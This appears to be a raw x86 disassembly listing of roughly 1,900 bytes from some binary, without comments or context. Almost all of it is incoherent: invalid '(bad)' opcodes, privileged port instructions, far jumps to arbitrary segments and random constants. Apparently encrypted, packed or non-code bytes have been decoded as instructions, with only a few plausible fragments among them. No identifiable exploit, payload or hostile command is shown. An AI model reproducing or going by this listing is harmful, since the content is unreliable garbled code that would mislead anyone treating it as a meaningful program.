  416699:	stos   BYTE PTR es:[edi],al
  41669a:	mov    bh,0x1e
  41669c:	es cmp eax,0xb080148d
  4166a2:	push   eax
  4166a3:	mov    al,ds:0x768cbe75
  4166a8:	fnsave [eax+0x52]
  4166ab:	outs   dx,BYTE PTR ds:[esi]
  4166ac:	retf   0xa91a
  4166af:	add    eax,0xdc098bdb
  4166b4:	push   0xffffff8d
  4166b6:	push   edi
  4166b7:	jmp    0xd121:0x29d5b3b0
  4166be:	push   cs
  4166bf:	leave  
  4166c0:	or     ecx,DWORD PTR [edx-0xdabaadd]
  4166c6:	sub    dl,BYTE PTR [edx]
  4166c8:	add    eax,ecx
  4166ca:	call   0xdc832944
  4166cf:	xchg   ebx,esp
  4166d1:	jns    0x416703
  4166d3:	inc    ebp
  4166d4:	cmp    ecx,ecx
  4166d6:	jno    0x41674d
  4166d8:	(bad)  
  4166d9:	ins    BYTE PTR es:[edi],dx
  4166da:	ins    DWORD PTR es:[edi],dx
  4166db:	icebp  
  4166dc:	cwde   
  4166dd:	(bad)  
  4166de:	imul   esp,ecx,0x1b
  4166e1:	scas   eax,DWORD PTR es:[edi]
  4166e2:	sbb    eax,0xdb79bff4
  4166e7:	jns    0x4166c7
  4166e9:	sub    DWORD PTR [edi+0x6e51e3e],0xffffffcc
  4166f0:	mov    WORD PTR [esi+0x3bbf5ab3],es
  4166f6:	or     edx,DWORD PTR [ecx+0x57]
  4166f9:	mov    ds:0x737b2554,al
  4166fe:	not    BYTE PTR [ebx+0x457294e0]
  416704:	or     DWORD PTR [ecx+eiz*1],ecx
  416707:	mov    ds:0xe519db2e,eax
  41670c:	push   cx
  41670e:	sbb    DWORD PTR [esi],eax
  416710:	das    
  416711:	dec    esp
  416712:	xor    dh,dh
  416714:	fidivr WORD PTR [edi+0x66807240]
  41671a:	into   
  41671b:	aad    0x4f
  41671d:	shr    BYTE PTR [ebx],cl
  41671f:	mov    BYTE PTR [esi-0x61],dl
  416722:	add    BYTE PTR [edx+0x2f],cl
  416725:	out    dx,eax
  416726:	ja     0x4166b4
  416728:	ror    ch,1
  41672a:	xchg   edx,eax
  41672b:	sbb    al,0xc1
  41672d:	fmul   QWORD PTR [edx+edx*1-0x4a50e372]
  416734:	push   ss
  416735:	xchg   ebp,eax
  416736:	mov    ebx,0xad78dc71
  41673b:	aam    0xd3
  41673d:	test   DWORD PTR [edx+0x513e41be],edi
  416743:	aad    0x6e
  416745:	sbb    BYTE PTR [edi-0x503c001],cl
  41674b:	xbegin 0x4750a37b
  416751:	daa    
  416752:	ret    
  416753:	lods   al,BYTE PTR ds:[esi]
  416754:	pop    edx
  416755:	or     BYTE PTR [ebp+eiz*4-0x38],ah
  416759:	retfw  0xe745
  41675d:	sub    BYTE PTR [ebx+0x2d],bh
  416760:	inc    esp
  416761:	mov    ch,0xe8
  416763:	xor    ecx,DWORD PTR [ecx+0x48]
  416766:	pop    ecx
  416767:	inc    esp
  416768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416769:	clc    
  41676a:	push   ebp
  41676b:	or     BYTE PTR es:[ebx+0x58],cl
  41676f:	fs push 0x28
  416772:	mov    ah,0xb6
  416774:	in     al,0xcf
  416776:	arpl   WORD PTR [edx+0x24694369],bx
  41677c:	jne    0x416763
  41677e:	dec    ebx
  41677f:	adc    dh,BYTE PTR [esi+0x45]
  416782:	jmp    0xda4a:0x19bb178b
  416789:	mov    ds:0xe5cee0a1,al
  41678e:	repz mov dh,0xa0
  416791:	stos   DWORD PTR es:[edi],eax
  416792:	int3   
  416793:	mov    bl,0xf8
  416795:	out    dx,eax
  416796:	push   edi
  416797:	xchg   esp,eax
  416798:	clc    
  416799:	das    
  41679a:	adc    ecx,DWORD PTR [edx-0x4fe51fc4]
  4167a0:	sbb    ah,cl
  4167a2:	add    al,0x10
  4167a4:	push   ebx
  4167a6:	push   cs
  4167a7:	iret   
  4167a8:	aam    0x9b
  4167aa:	in     eax,0x9a
  4167ac:	dec    edi
  4167ad:	lods   eax,DWORD PTR ds:[esi]
  4167ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167af:	pop    es
  4167b0:	loop   0x41678d
  4167b2:	push   esp
  4167b3:	sbb    ah,BYTE PTR [eax+0x48]
  4167b6:	dec    edx
  4167b7:	(bad)  
  4167b9:	or     al,BYTE PTR [esi+eax*4+0x14]
  4167bd:	lods   eax,DWORD PTR ds:[esi]
  4167be:	xchg   edi,eax
  4167bf:	dec    esi
  4167c0:	mov    BYTE PTR ds:0x4a33a9a6,dh
  4167c6:	les    esi,FWORD PTR [esi]
  4167c8:	mov    al,ds:0x5658c45d
  4167ce:	inc    ebp
  4167cf:	bound  ecx,QWORD PTR ds:0xbd7e400d
  4167d5:	or     dh,bl
  4167d7:	add    eax,0x676120ca
  4167dc:	repnz push esp
  4167de:	xchg   ebx,eax
  4167df:	in     eax,0x6e
  4167e1:	std    
  4167e2:	inc    esi
  4167e3:	aas    
  4167e4:	rcl    BYTE PTR [ebx],0xac
  4167e7:	sub    esi,edx
  4167e9:	add    BYTE PTR [edi+edx*8],cl
  4167ec:	cmp    BYTE PTR [ecx+0x79],0xc1
  4167f0:	adc    esi,DWORD PTR [ebx+0x771e29ae]
  4167f6:	not    bh
  4167f8:	add    eax,0x709662b5
  4167fd:	mov    DWORD PTR [ecx],eax
  4167ff:	mov    eax,DWORD PTR [ebp-0x8]
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	and    DWORD PTR [ecx+0x2376afe9],0x7e95787f
  416822:	js     0x41689c
  416824:	mov    DWORD PTR [eax+eax*8],ebp
  416827:	stos   BYTE PTR es:[edi],al
  416828:	push   eax
  416829:	and    DWORD PTR [ecx-0x1c],0xf90fa6fa
  416830:	or     esi,DWORD PTR [edx+0x75]
  416833:	aaa    
  416834:	cmp    esp,esi
  416836:	dec    edx
  416837:	btr    DWORD PTR [edi],ebx
  41683a:	inc    edi
  41683b:	ror    BYTE PTR [ecx],0xdc
  41683e:	jnp    0x4168b1
  416840:	imul   ebp,DWORD PTR [edx+0x47],0xffffffac
  416844:	pop    esi
  416845:	icebp  
  416846:	std    
  416847:	cdq    
  416848:	test   dh,cl
  41684a:	push   esp
  41684b:	nop
  41684c:	enter  0x2316,0xdd
  416850:	cld    
  416851:	test   eax,0xc4d37ef4
  416856:	(bad)  
  416857:	jmp    0x4168c3
  416859:	popa   
  41685a:	sub    al,0xc3
  41685c:	int    0x63
  41685e:	jb     0x41683b
  416860:	aad    0x5
  416862:	ins    DWORD PTR es:[edi],dx
  416863:	xor    BYTE PTR [edx],bl
  416865:	jns    0x416835
  416867:	pop    es
  416868:	fwait
  416869:	xor    al,0x69
  41686b:	push   ecx
  41686c:	sbb    eax,0x4e9ffc3f
  416871:	jb     0x416810
  416873:	in     al,dx
  416874:	rcr    DWORD PTR [esp+ebp*8+0x4b],1
  416878:	push   esp
  416879:	in     al,0xa2
  41687b:	jle    0x416810
  41687d:	retf   
  41687e:	inc    edx
  41687f:	sbb    dl,ah
  416881:	or     DWORD PTR [ebx+0x6a],ebx
  416884:	std    
  416885:	jmp    0x62ae12e2
  41688a:	pop    ebp
  41688b:	ins    BYTE PTR es:[edi],dx
  41688c:	adc    eax,0x394cad10
  416891:	setg   BYTE PTR [ecx+0x49]
  416895:	dec    ebp
  416896:	push   ebp
  416897:	scas   al,BYTE PTR es:[edi]
  416898:	dec    ebp
  416899:	and    al,0xec
  41689b:	pop    ebp
  41689c:	ja     0x41682d
  41689e:	xchg   DWORD PTR [ebx+0x1dcd5a40],esi
  4168a4:	mov    ah,0x31
  4168a6:	(bad)
  4168aa:	dec    esp
  4168ab:	lea    ecx,[ebx]
  4168ad:	push   ds
  4168ae:	push   es
  4168af:	fisttp DWORD PTR [edx+0x38cbc5ff]
  4168b5:	push   ss
  4168b6:	retf   
  4168b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b8:	mov    bl,0xbe
  4168ba:	push   eax
  4168bb:	cs dec ebx
  4168bd:	daa    
  4168be:	fwait
  4168bf:	xchg   esp,eax
  4168c0:	stc    
  4168c1:	xor    BYTE PTR [edi-0x7c],al
  4168c4:	and    al,0x18
  4168c6:	xor    BYTE PTR [esi-0x4c27594a],bh
  4168cc:	or     al,0xfd
  4168ce:	mov    al,0xa5
  4168d0:	add    al,0x8b
  4168d2:	lea    esp,[ecx+0x73]
  4168d5:	push   eax
  4168d6:	les    ecx,FWORD PTR [ebx-0x5501f4b1]
  4168dc:	sbb    BYTE PTR ds:0xb0f59d98,cl
  4168e2:	adc    edi,DWORD PTR [esi+0x472c2144]
  4168e8:	cmp    ah,BYTE PTR [ecx-0x1e]
  4168eb:	mov    ah,0xfc
  4168ed:	cs iret 
  4168ef:	or     BYTE PTR [esi+0x6cf52091],ch
  4168f5:	fcmovnb st,st(5)
  4168f7:	loope  0x4168a7
  4168f9:	jmp    FWORD PTR [ecx-0x2de65640]
  4168ff:	cmp    ebx,DWORD PTR [ebx+0x4f6a94d1]
  416905:	inc    eax
  416906:	pop    ebp
  416907:	add    eax,0x261a88e2
  41690c:	sub    DWORD PTR [ecx+0x5],edx
  41690f:	scas   eax,DWORD PTR es:[edi]
  416910:	xchg   esi,eax
  416911:	push   es
  416912:	push   edi
  416913:	pop    ds
  416914:	out    0x3d,eax
  416916:	cwde   
  416917:	out    0x4f,eax
  416919:	adc    eax,DWORD PTR [edi]
  41691b:	push   edx
  41691c:	stos   BYTE PTR es:[edi],al
  41691d:	xchg   ecx,eax
  41691e:	dec    ebx
  41691f:	and    ebp,DWORD PTR [esi]
  416921:	retf   0x541e
  416924:	jne    0x416987
  416926:	or     eax,0xb66cd9de
  41692b:	xchg   ecx,eax
  41692c:	lds    esi,FWORD PTR [ecx-0x59e171fb]
  416932:	dec    ebx
  416933:	jb     0x416992
  416935:	clc    
  416936:	ja     0x41696f
  416938:	mov    al,ds:0x3b420c77
  41693d:	pushf  
  41693e:	ficomp DWORD PTR [ebx]
  416940:	and    edx,DWORD PTR [ecx+0x49]
  416943:	stos   BYTE PTR es:[edi],al
  416944:	jnp    0x41690c
  416946:	pop    ebp
  416947:	bound  esp,QWORD PTR [ebp-0x77327837]
  41694d:	inc    esi
  41694e:	(bad)  
  41694f:	jmp    0x416929
  416951:	scas   al,BYTE PTR es:[edi]
  416952:	mov    ch,0x4f
  416954:	cmp    al,0x26
  416956:	push   eax
  416957:	in     al,dx
  416958:	dec    ecx
  416959:	lock mov edi,DWORD PTR [esi]
  41695c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41695e:	test   ebx,0x513ed6a
  416964:	mov    cl,0xe6
  416966:	xchg   esi,eax
  416967:	(bad)  
  416968:	inc    esi
  416969:	push   ebp
  41696a:	mov    bl,0xa8
  41696c:	fsubr  DWORD PTR [edi-0x4c4ae53]
  416972:	scas   eax,DWORD PTR es:[edi]
  416973:	call   0x314a:0x21752d3b
  41697a:	ins    DWORD PTR es:[edi],dx
  41697b:	pop    ss
  41697c:	pop    ebp
  41697d:	data16 jg 0x4169ae
  416980:	scas   eax,DWORD PTR es:[edi]
  416981:	or     ecx,esp
  416983:	fisttp WORD PTR [ebx]
  416985:	sub    eax,0x4f3848a7
  41698a:	xor    al,0x11
  41698c:	mov    al,0x94
  41698e:	xor    al,0xbb
  416990:	add    DWORD PTR ds:0x8c5a97eb,esi
  416996:	mul    BYTE PTR [ecx-0x80]
  416999:	jbe    0x416964
  41699b:	xchg   DWORD PTR [ebp+0x7f],ebp
  41699e:	aaa    
  41699f:	lea    ecx,[ebp+0x0]
  4169a2:	ret    0xd18e
  4169a5:	(bad)
  4169a8:	xchg   edx,eax
  4169a9:	es (bad) 
  4169ab:	ror    DWORD PTR [edi+0x4693398d],0x86
  4169b2:	or     cl,BYTE PTR gs:[edi-0x76b84c66]
  4169b9:	stos   BYTE PTR es:[edi],al
  4169ba:	stos   BYTE PTR es:[edi],al
  4169bb:	mov    dh,0x42
  4169bd:	addr16 cmp dh,bh
  4169c0:	mov    WORD PTR [eax],ss
  4169c2:	mov    ebp,0xe75afd7
  4169c7:	pop    esi
  4169c8:	or     ah,BYTE PTR [edi]
  4169ca:	jp     0x416a26
  4169cc:	sbb    dh,dl
  4169ce:	sbb    bl,BYTE PTR [esi+esi*1-0x6c8c69a3]
  4169d5:	rcr    DWORD PTR [edx-0x10010be3],1
  4169db:	fadd   QWORD PTR [edi+ebp*2-0x31ea6d1d]
  4169e2:	jnp    0x416993
  4169e4:	in     al,0xfd
  4169e6:	jp     0x4169ea
  4169e8:	int3   
  4169e9:	fist   WORD PTR [edi+0x14bd6582]
  4169ef:	sbb    eax,0x337a1a1e
  4169f4:	xchg   edx,eax
  4169f5:	rcr    dh,cl
  4169f7:	fwait
  4169f8:	mov    eax,0x82af3315
  4169fd:	les    edx,FWORD PTR ds:0x197132b3
  416a03:	jmp    0xbe0:0x11daeb04
  416a0a:	push   ds
  416a0b:	iret   
  416a0c:	mov    bh,0x17
  416a0e:	mov    dl,0xbc
  416a10:	lds    edi,FWORD PTR [edi+0x32d1841b]
  416a16:	cdq    
  416a17:	jnp    0x4169b0
  416a19:	cmp    BYTE PTR [edi+0x2f38670b],bh
  416a1f:	dec    ecx
  416a20:	push   esi
  416a21:	xchg   BYTE PTR [ebp+0x62],al
  416a24:	or     al,0xbd
  416a26:	xchg   esp,eax
  416a27:	jl     0x416a1d
  416a29:	mov    WORD PTR ds:[ebx+0x5790325b],ss
  416a30:	jne    0x416aab
  416a32:	sbb    al,0x13
  416a34:	mov    esp,0xfc74a5f1
  416a39:	add    al,0xba
  416a3b:	pop    DWORD PTR [ecx+0x3c]
  416a3e:	add    dl,BYTE PTR [ecx]
  416a40:	int3   
  416a41:	or     ebp,DWORD PTR [esi]
  416a43:	ret    
  416a44:	pop    eax
  416a45:	pop    eax
  416a46:	push   ecx
  416a47:	sbb    al,BYTE PTR [ecx-0x18f7645a]
  416a4d:	xchg   edx,eax
  416a4e:	sub    ebp,DWORD PTR [esi+ebx*2+0x70]
  416a52:	add    BYTE PTR [ebx],dh
  416a54:	jp     0x416a90
  416a56:	std    
  416a57:	in     al,dx
  416a58:	push   0x19
  416a5a:	aaa    
  416a5b:	jae    0x416a99
  416a5d:	stos   BYTE PTR es:[edi],al
  416a5e:	sub    dl,BYTE PTR [eax+0x4ed31fe7]
  416a64:	daa    
  416a65:	not    BYTE PTR [eax+0x68]
  416a68:	sbb    bh,bh
  416a6a:	add    esi,eax
  416a6c:	addr16 pop esp
  416a6e:	mov    ecx,0x29cced08
  416a73:	aam    0x2d
  416a75:	xchg   esi,eax
  416a76:	(bad)  
  416a78:	xchg   edi,eax
  416a79:	cmp    al,0x27
  416a7b:	and    ah,0xf5
  416a7e:	test   BYTE PTR [ecx],ch
  416a80:	aam    0x27
  416a82:	add    al,dl
  416a84:	jmp    0x95e8:0x181c763c
  416a8b:	ja     0x416a28
  416a8d:	xchg   ebx,eax
  416a8e:	push   0x2c
  416a90:	pop    ebx
  416a91:	cld    
  416a92:	rcl    BYTE PTR [edi+eiz*4],cl
  416a95:	pop    ds
  416a96:	dec    ebx
  416a97:	mov    ebp,0x8a3669f9
  416a9c:	fiadd  WORD PTR [ebx-0x193fc897]
  416aa2:	cld    
  416aa3:	inc    edi
  416aa4:	call   0x5bc160fc
  416aa9:	out    dx,eax
  416aaa:	and    bh,BYTE PTR [eax]
  416aac:	inc    ebp
  416aad:	(bad)  
  416aae:	mov    edx,0x13cd6e52
  416ab3:	cwde   
  416ab4:	int3   
  416ab5:	xor    eax,ebx
  416ab7:	mov    cl,0x7c
  416ab9:	jg     0x416af0
  416abb:	mov    eax,ds:0x8b2eb8a6
  416ac0:	inc    ebp
  416ac1:	cld    
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x4164ff75
  416ad4:	daa    
  416ad5:	dec    DWORD PTR [edi]
  416ad7:	xchg   ebx,eax
  416ad8:	and    BYTE PTR [edi+0x78],bh
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416a99
  416ae0:	push   ds
  416ae1:	shr    esi,0x1e
  416ae4:	ins    BYTE PTR es:[edi],dx
  416ae5:	in     al,dx
  416ae6:	rcl    DWORD PTR [ebx],cl
  416ae8:	add    ch,BYTE PTR [ebx+0x59]
  416aeb:	mov    eax,0xd5a63195
  416af0:	outs   dx,DWORD PTR ds:[esi]
  416af1:	test   DWORD PTR [eax-0x42530923],ebx
  416af7:	outs   dx,DWORD PTR ds:[esi]
  416af8:	js     0x416ad7
  416afa:	adc    eax,0xcb8e9733
  416aff:	and    dh,BYTE PTR [ecx]
  416b01:	sbb    DWORD PTR [ecx],edi
  416b03:	outs   dx,DWORD PTR ds:[esi]
  416b04:	aam    0x64
  416b06:	jae    0x416a90
  416b08:	js     0x416b38
  416b0a:	stos   DWORD PTR es:[edi],eax
  416b0b:	xlat   BYTE PTR ds:[ebx]
  416b0c:	fs lahf 
  416b0e:	adc    esi,esi
  416b10:	push   esp
  416b11:	(bad)  
  416b12:	mov    al,0x6c
  416b14:	stos   BYTE PTR es:[edi],al
  416b15:	inc    BYTE PTR [edx-0x23]
  416b18:	xor    ch,cl
  416b1a:	mov    esp,eax
  416b1c:	sar    DWORD PTR [edi+0x9],1
  416b1f:	call   0x79f6:0x57f8819b
  416b26:	outs   dx,BYTE PTR ds:[esi]
  416b27:	adc    BYTE PTR [ebx],dl
  416b29:	push   edx
  416b2a:	mov    edi,0xd0b17d15
  416b2f:	scas   eax,DWORD PTR es:[edi]
  416b30:	loope  0x416b5c
  416b32:	rcl    DWORD PTR [esi],cl
  416b34:	dec    edx
  416b35:	pop    esp
  416b36:	xchg   BYTE PTR [edx-0x63],dl
  416b39:	cmp    al,0xbe
  416b3b:	jl     0x416b3b
  416b3d:	lods   al,BYTE PTR ds:[esi]
  416b3e:	(bad)  
  416b3f:	jmp    0x48b26f8
  416b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b45:	fdivr  DWORD PTR [ebx+0x66]
  416b48:	mov    ds:0x3c465a3a,eax
  416b4d:	pop    ecx
  416b4e:	push   ebp
  416b4f:	pop    edx
  416b50:	out    0x3f,eax
  416b52:	lods   al,BYTE PTR ds:[esi]
  416b53:	shl    BYTE PTR [esi+0x5866ccef],1
  416b59:	cmc    
  416b5a:	aaa    
  416b5b:	mov    edi,0xbc38330b
  416b60:	test   BYTE PTR [ecx+ebp*2],cl
  416b63:	ins    DWORD PTR es:[edi],dx
  416b64:	jnp    0x416b64
  416b66:	jge    0x416b38
  416b68:	push   esp
  416b69:	add    DWORD PTR [ebx-0x10],edi
  416b6c:	add    dl,BYTE PTR [ecx+0x0]
  416b6f:	xchg   edi,eax
  416b70:	sbb    ch,BYTE PTR [ecx]
  416b72:	jo     0x416bc0
  416b74:	das    
  416b75:	adc    al,0xa6
  416b77:	sahf   
  416b78:	push   ss
  416b79:	xor    al,0x88
  416b7b:	jne    0x416b1d
  416b7d:	mov    WORD PTR [eax+esi*4+0x43],?
  416b81:	dec    esp
  416b82:	test   DWORD PTR ss:[ecx+0xdcdbdfe],0xe782eef5
  416b8d:	cli    
  416b8e:	arpl   WORD PTR [ebx+ebx*1],dx
  416b91:	aaa    
  416b92:	mov    DWORD PTR ds:0xb225405a,edi
  416b98:	push   0xffffff87
  416b9a:	test   esp,edx
  416b9c:	mov    eax,ds:0x1dac8868
  416ba1:	shl    DWORD PTR [ecx+esi*2],0xb0
  416ba5:	or     BYTE PTR [ecx-0x5db829aa],al
  416bab:	xlat   BYTE PTR ds:[ebx]
  416bac:	sbb    DWORD PTR [ecx],ebx
  416bae:	stc    
  416baf:	push   es
  416bb0:	dec    ecx
  416bb1:	jo     0x416b3b
  416bb3:	es dec edx
  416bb5:	pop    ebp
  416bb6:	push   esp
  416bb7:	and    al,0xb5
  416bb9:	mul    DWORD PTR [esi]
  416bbb:	test   al,0x7b
  416bbd:	push   edi
  416bbe:	fiadd  DWORD PTR [ebx-0x68]
  416bc1:	pop    ebp
  416bc2:	cmc    
  416bc3:	lods   al,BYTE PTR gs:[esi]
  416bc5:	rol    DWORD PTR [edx],cl
  416bc7:	jl     0x416c0b
  416bc9:	inc    esp
  416bca:	mulps  xmm7,XMMWORD PTR [ecx+0x2]
  416bce:	cld    
  416bcf:	pop    ebx
  416bd0:	aam    0x0
  416bd2:	rol    BYTE PTR [esi],1
  416bd4:	ror    DWORD PTR [ecx+ecx*8+0x41],0xe6
  416bd9:	std    
  416bda:	mov    DWORD PTR [esi+0x6b65ea8f],edx
  416be0:	push   ebp
  416be1:	xor    ah,BYTE PTR [ecx]
  416be3:	dec    edx
  416be4:	ret    0xc18b
  416be7:	out    dx,eax
  416be8:	add    al,0x66
  416bea:	sbb    dl,BYTE PTR [ebp+0x60]
  416bed:	mov    bh,0xa9
  416bef:	inc    esi
  416bf0:	adc    esp,DWORD PTR [edi+edi*4+0x73]
  416bf4:	inc    edx
  416bf5:	imul   esp,DWORD PTR [edx+eiz*8+0x7b],0x17caf629
  416bfd:	mov    eax,0x578fa36f
  416c02:	jg     0x416c53
  416c04:	addr16 retf 
  416c06:	nop
  416c07:	adc    ch,BYTE PTR [ebx+0x4d]
  416c0a:	in     eax,0xf0
  416c0c:	popf   
  416c0d:	xor    esp,DWORD PTR [edi]
  416c0f:	arpl   si,cx
  416c11:	pop    esi
  416c12:	adc    ch,BYTE PTR [ebp-0x2b3a51db]
  416c18:	sahf   
  416c19:	push   0x17
  416c1b:	aaa    
  416c1c:	cld    
  416c1d:	repz int3 
  416c1f:	and    al,0x9c
  416c21:	iret   
  416c22:	cli    
  416c23:	add    eax,0x90e758e7
  416c28:	lock mov al,0x77
  416c2b:	cmc    
  416c2c:	lds    ebp,FWORD PTR [edx]
  416c2e:	mov    eax,0x62d10dd9
  416c33:	leave  
  416c34:	pop    ecx
  416c35:	inc    eax
  416c36:	mov    al,ds:0x5e3bf4b6
  416c3b:	inc    esi
  416c3c:	lods   al,BYTE PTR ds:[esi]
  416c3d:	lods   eax,DWORD PTR ds:[esi]
  416c3e:	add    bl,ah
  416c40:	lods   eax,DWORD PTR ds:[esi]
  416c41:	ficom  WORD PTR ds:0xbb708d78
  416c47:	(bad)  
  416c48:	push   0x10
  416c4a:	retf   
  416c4b:	xchg   DWORD PTR [ebx-0x39d7c6df],ecx
  416c51:	sub    ch,BYTE PTR [esi]
  416c53:	cmc    
  416c54:	scas   al,BYTE PTR es:[edi]
  416c55:	jle    0x416ca6
  416c57:	sub    al,0x42
  416c59:	inc    esi
  416c5a:	sbb    DWORD PTR [ebx],0xffffff80
  416c5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c5e:	pop    esp
  416c5f:	or     dh,BYTE PTR [esi+ebp*8-0x15f66bda]
  416c66:	or     eax,DWORD PTR [ecx]
  416c68:	cmp    cl,ah
  416c6a:	cmp    BYTE PTR [edx-0x36],bh
  416c6d:	mov    ebp,0xdd84aa06
  416c72:	add    eax,0x54e67c44
  416c77:	jge    0x416c5b
  416c79:	add    ch,BYTE PTR [esi+edi*8]
  416c7c:	scas   eax,DWORD PTR es:[edi]
  416c7d:	ror    DWORD PTR [ecx+0x69],1
  416c80:	cmc    
  416c81:	stos   DWORD PTR es:[edi],eax
  416c82:	sub    ebp,ecx
  416c84:	call   0xea6a:0xc71f94ca
  416c8b:	mov    eax,0x7f3b7c63
  416c90:	sub    esp,ebp
  416c92:	cld    
  416c93:	dec    edx
  416c94:	push   cs
  416c95:	in     al,0xd8
  416c97:	(bad)  
  416c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c99:	aas    
  416c9a:	outs   dx,DWORD PTR ds:[esi]
  416c9b:	js     0x416cd9
  416c9d:	adc    BYTE PTR [edi+0x7c],dh
  416ca0:	xchg   cl,al
  416ca2:	leave  
  416ca3:	push   ds
  416ca4:	jmp    0x416cb5
  416ca6:	mov    DWORD PTR [ebx],esi
  416ca8:	inc    ebx
  416ca9:	in     eax,0xbb
  416cab:	push   ebx
  416cac:	cdq    
  416cad:	mov    edi,0xa5096a15
  416cb2:	and    DWORD PTR [esi+0x94904a5],0xb5b6e175
  416cbc:	jno    0x416d00
  416cbe:	cmp    DWORD PTR [ecx+0x43],edi
  416cc1:	repz mov al,ds:0x6cf59409
  416cc7:	mov    cl,0x8b
  416cc9:	sub    esi,DWORD PTR [ecx+ebp*8-0x75]
  416ccd:	mov    eax,0x633da4e1
  416cd2:	test   eax,0x3034304e
  416cd7:	adc    BYTE PTR [ebx-0x6dc0e68b],ch
  416cdd:	push   ebp
  416cde:	mov    ah,0xc1
  416ce0:	push   ds
  416ce1:	mov    dl,0xd5
  416ce3:	(bad)  
  416ce5:	js     0x416d20
  416ce7:	jp     0x416ced
  416ce9:	xchg   edi,eax
  416cea:	sub    ecx,esp
  416cec:	scas   eax,DWORD PTR es:[edi]
  416ced:	icebp  
  416cee:	inc    ebx
  416cef:	fwait
  416cf0:	inc    edi
  416cf1:	in     al,dx
  416cf2:	lods   al,BYTE PTR ds:[esi]
  416cf3:	push   ecx
  416cf4:	inc    ebp
  416cf5:	cmp    ebx,ebp
  416cf7:	das    
  416cf8:	lds    esp,FWORD PTR [ecx-0x7757531e]
  416cfe:	jnp    0x416d12
  416d00:	xor    al,0x81
  416d02:	ins    DWORD PTR es:[edi],dx
  416d03:	repz or al,0xaa
  416d06:	(bad)  
  416d07:	into   
  416d08:	sbb    edi,DWORD PTR [ecx-0x68da7f9]
  416d0e:	push   ecx
  416d0f:	add    al,0xbd
  416d11:	pop    ds
  416d12:	test   eax,0xd8cf11ac
  416d17:	inc    eax
  416d18:	je     0x416d62
  416d1a:	aas    
  416d1b:	push   es
  416d1c:	and    DWORD PTR [esi-0x47],edx
  416d1f:	je     0x416d99
  416d21:	mov    BYTE PTR [ebx+0x21],dl
  416d24:	in     eax,0xa2
  416d26:	out    0xda,al
  416d28:	jnp    0x416d71
  416d2a:	xchg   edi,eax
  416d2b:	cmp    al,0xa2
  416d2d:	popa   
  416d2e:	stc    
  416d2f:	out    0x7f,eax
  416d31:	jmp    DWORD PTR [edx+0x1a]
  416d34:	mov    DWORD PTR [esi],ebx
  416d36:	test   al,0x10
  416d38:	add    esi,DWORD PTR [edi-0x20c91f1]
  416d3e:	pop    edx
  416d3f:	jno    0x416d7a
  416d41:	jno    0x416dab
  416d43:	mov    al,0xd1
  416d45:	inc    edx
  416d46:	jmp    0x2cfa:0x1e0107da
  416d4d:	nop
  416d4e:	ret    0x4605
  416d51:	daa    
  416d52:	cwde   
  416d53:	ds jl  0x416da5
  416d56:	ja     0x416dd2
  416d58:	les    edi,FWORD PTR [esi+0x75a499fd]
  416d5e:	and    BYTE PTR [eax],ch
  416d60:	test   cl,dh
  416d62:	popf   
  416d63:	into   
  416d64:	push   edx
  416d65:	or     DWORD PTR ds:0xb6f50899,edi
  416d6b:	or     eax,DWORD PTR [edi+0x14389e63]
  416d71:	jecxz  0x416cff
  416d73:	xor    al,0xd1
  416d75:	sub    DWORD PTR [ebp-0x74dea45a],eax
  416d7b:	dec    ebp
  416d7c:	adc    BYTE PTR [ebx],dh
  416d7e:	mov    DWORD PTR [ebx],0xfc13bc6
  416d84:	test   DWORD PTR [ebx-0x74fffffb],edx
  416d8a:	inc    ebp
  416d8b:	cld    
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0x88ea:0xfb381efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	jl     0x416de6
  416db9:	cmp    ah,bl
  416dbb:	dec    edi
  416dbc:	gs sahf 
  416dbe:	leave  
  416dbf:	pop    esi
  416dc0:	neg    DWORD PTR ds:0x4f96c9b6
  416dc6:	inc    edx
  416dc7:	dec    bh
  416dc9:	das    
  416dca:	add    al,0x78
  416dcc:	cs mov esi,0xdd1a2ecb
  416dd2:	add    bl,bh
  416dd4:	and    DWORD PTR [esi],edi
  416dd6:	and    dh,BYTE PTR [eax+0x62]
  416dd9:	xchg   ebp,eax
  416dda:	cs test al,dl
  416ddd:	mov    dl,0x24
  416ddf:	int    0x20
  416de1:	xor    BYTE PTR [eax],bh
  416de3:	mov    dh,BYTE PTR [edi+ebx*8-0x9a9c7cd]
  416dea:	add    bh,BYTE PTR [esi]
  416dec:	or     DWORD PTR [ebp+0x26b656df],eax
  416df2:	jg     0x416de5
  416df4:	inc    edx
  416df5:	rcl    DWORD PTR [ebp+0x7dabd147],1
  416dfb:	adc    BYTE PTR [edi],dl
  416dfd:	shr    DWORD PTR [ebp+0x61db76f],cl
  416e03:	test   eax,0x15237a67
  416e08:	inc    esp
  416e09:	je     0x416d9f
  416e0b:	in     eax,dx
  416e0c:	(bad)  
  416e0d:	xchg   ecx,eax
  416e0e:	outs   dx,BYTE PTR ds:[esi]
  416e0f:	in     al,0xb1
  416e11:	popa   
  416e12:	les    eax,FWORD PTR [edx+ecx*4-0x5633afdc]
  416e19:	iret   
  416e1a:	push   esi
  416e1b:	and    dl,BYTE PTR [eax]
  416e1d:	loope  0x416daa
  416e1f:	inc    eax
